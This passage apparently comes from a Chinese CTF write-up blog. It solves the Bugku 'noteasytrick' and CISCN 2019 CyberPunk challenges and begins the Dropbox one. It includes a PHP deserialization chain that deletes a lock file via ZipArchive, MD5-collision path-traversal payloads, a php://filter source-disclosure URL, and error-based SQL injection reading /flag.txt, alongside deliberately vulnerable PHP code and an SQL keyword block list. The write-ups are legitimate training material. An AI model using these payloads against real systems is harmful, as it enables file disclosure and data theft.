    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">me</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Ctf</span> <span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"die"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"./sandbox/lock.lock"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"./sandbox/"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"or you can guess the final filename?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span></code></pre>
<p>理解一下这段代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"./sandbox/lock.lock"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"./sandbox/"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"or you can guess the final filename?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span></code></pre>
<p>如果存在<code>./sandbox/lock.lock</code>die掉，访问<code>./sandbox/lock.lock</code>很显然是存在的</p>
<p>如果不存在执行<code>echo file_get_contents(substr($_POST['b'],0,30));</code>很显然又是一个危险函数，只要让b=flag之类的就行</p>
<p>所以这里我们要使用ZipArchive内置函数删除文件</p>
<p><strong>payload：</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Jesen</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'./sandbox/lock.lock'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$me</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span>  <span class="token class-name">Jesen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$zip</span>  <span class="token operator">=</span> <span class="token keyword">new</span>  <span class="token class-name">ZipArchive</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">me</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'":3:'</span><span class="token punctuation">,</span><span class="token string">'":4:'</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span></code></pre>
<p><img src="/2021/10/28/bugku-noteasytrick/image-20211028200859831.png" alt="image-20211028200859831"></p>
<pre><code>a[]=1&amp;b[]=2&amp;c=O:5:"Jesen":4:{s:8:"filename";s:19:"./sandbox/lock.lock";s:7:"content";i:8;s:2:"me";O:10:"ZipArchive":5:{s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:0:"";}}</code></pre>
<p>就可以数组绕过MD5判断并删除文件</p>
<p>那么现在就要构造b获取flag</p>
<pre><code>./../../../../../../../../flag</code></pre>
<p>利用fastcoll工具</p>
<pre><code>fastcoll_v1.0.0.5 -p 1.txt -o 2.txt 3.txt</code></pre>
<p><img src="/2021/10/28/bugku-noteasytrick/image-20211028201112818.png" alt="image-20211028201112818"></p>
<p>检查及编码脚本</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$fh</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">'============================'</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//echo urlencode(readmyfile("1.txt"));</span>
<span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//echo '============================';</span>
<span class="token comment" spellcheck="true">//echo urlencode(readmyfile("2.txt"));</span></code></pre>
<p><strong>c：</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Jesen</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span><span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span><span class="token variable">$me</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Jesen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><strong>payload：</strong></p>
<pre><code>a=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%E9%86v%A1b%E9g%7B%C8%8A%84q%C3%7D%E0%B8%83%9B%EA%1C%E1%86%19%17%5E%3A%11%B9%A2%AB%E5%9C%1B%B6%0D%3E%84%D6%F2%8F%E8%EF1%BFm%95%F7%BC%87%C2%D9k%5D4%F1%FE%D7%F7%7B%A5%A0%DF%5D%C5P%BB%0D%27%12%D1%0DlLR%B1%D7%B4%22%D3u%60H%276%BD+%8At%C9%BF%5BOLOAp%C6%C8%AA%82k%93%9E%E8%BC%EB%B8s2%87I%DC%18%2F_I%22%F0%F3%CF%5D%05%9D%B2%0B%7DU&amp;b=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%E9%86v%A1b%E9g%7B%C8%8A%84q%C3%7D%E0%B8%83%9Bj%1C%E1%86%19%17%5E%3A%11%B9%A2%AB%E5%9C%1B%B6%0D%3E%84%D6%F2%8F%E8%EF1%BF%ED%95%F7%BC%87%C2%D9k%5D4%F1%FE%D7%F7%FB%A5%A0%DF%5D%C5P%BB%0D%27%12%D1%0DlLR%B1%D7%B4%22%D3u%60H%A76%BD+%8At%C9%BF%5BOLOAp%C6%C8%AA%82k%93%9E%E8%BC%EB%B8s%B2%86I%DC%18%2F_I%22%F0%F3%CF%5D%05%1D%B2%0B%7DU&amp;c=O:5:"Jesen":3:{s:8:"filename";N;s:7:"content";N;s:2:"me";N;}</code></pre>
<p><img src="/2021/10/28/bugku-noteasytrick/image-20211028201303219.png" alt="image-20211028201303219"></p>
]]></content>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN:2019-CyberPunk</title>
    <url>/2021/07/27/ciscn-2019-cyberpunk/</url>
    <content><![CDATA[<p><img src="/2021/07/27/ciscn-2019-cyberpunk/1.png" alt="1"></p>
<p><img src="/2021/07/27/ciscn-2019-cyberpunk/2.png" alt="2"></p>
<pre><code>http://479a5d57-76a6-4e2e-b8b1-edb840483fdf.node4.buuoj.cn/?file=php://filter/convert.base64-encode/resource=index.php</code></pre>
<p><img src="/2021/07/27/ciscn-2019-cyberpunk/3.png" alt="3"></p>
<p>base64解码以后有用的：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// $file = $_GET["file"];</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/phar|zip|bzip2|zlib|data|input|%00/i"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'no way!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    @<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<h5 id="ini-set-为一个配置选项设置值"><a href="#ini-set-为一个配置选项设置值" class="headerlink" title="ini_set:为一个配置选项设置值"></a>ini_set:为一个配置选项设置值</h5><h5 id="change-php"><a href="#change-php" class="headerlink" title="change.php:"></a>change.php:</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> "è®¢åä</code></pre>
<h5 id="search-php"><a href="#search-php" class="headerlink" title="search.php:"></a>search.php:</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">require_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span> 

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>
    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'no sql inject!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span><span class="token punctuation">;</span>
        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"&lt;p>å§å:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>&lt;p>, çµè¯:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>&lt;p>, å°å:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"æªæ¾å°è®¢å!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"ä¿¡æ¯ä¸å¨"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>address只是进行了简单的转义</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span></code></pre>
<h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><pre><code>1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)#</code></pre>
<pre><code>1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),20,50)),0x7e),1)#</code></pre>
<p>先在初始页面随便输数据，记住姓名电话</p>
<p>接着修改地址，地址修改为所构造的payload。修改之后再次修改，将地址设置为随便一个正常值，比如1，这样就能看到报错页面。</p>
<p>如果想要使用新的payload，只需要删除订单在重复以上操作即可。</p>
<pre><code>flag{46f184ea-6e18-43cb-8ff7-26925d95d827}</code></pre>
]]></content>
      <tags>
        <tag>sqli</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN:2019-Dropbox</title>
    <url>/2021/07/22/ciscn-2019-dropbox/</url>
    <content><![CDATA[<p>注册登录后随便上传一个后缀改为jpg的文件</p>
<p><img src="/2021/07/22/ciscn-2019-dropbox/image-20210723032128961.png" alt="image-20210723032128961"></p>
<p>点击下载</p>
<p><img src="/2021/07/22/ciscn-2019-dropbox/image-20210723032026577.png" alt="image-20210723032026577"></p>
